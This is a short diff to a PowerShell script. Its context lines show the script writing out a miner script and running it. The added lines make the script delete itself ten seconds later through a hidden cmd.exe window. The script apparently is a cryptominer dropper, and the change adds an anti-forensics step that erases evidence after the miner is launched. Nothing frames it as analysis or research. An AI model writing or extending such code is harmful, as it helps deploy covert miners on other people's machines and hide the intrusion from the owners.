@@ -161,3 +161,10 @@ $minerScriptContent | Out-File -FilePath $minerScriptPath -Encoding UTF8
 
 # Run the miner script
 & $minerScriptPath
+
+
+# Get the current script path
+$scriptPath = $MyInvocation.MyCommand.Path
+
+# Use cmd to start a delayed delete
+Start-Process "cmd.exe" -ArgumentList "/c timeout 10 & del `"$scriptPath`"" -WindowStyle Hidden
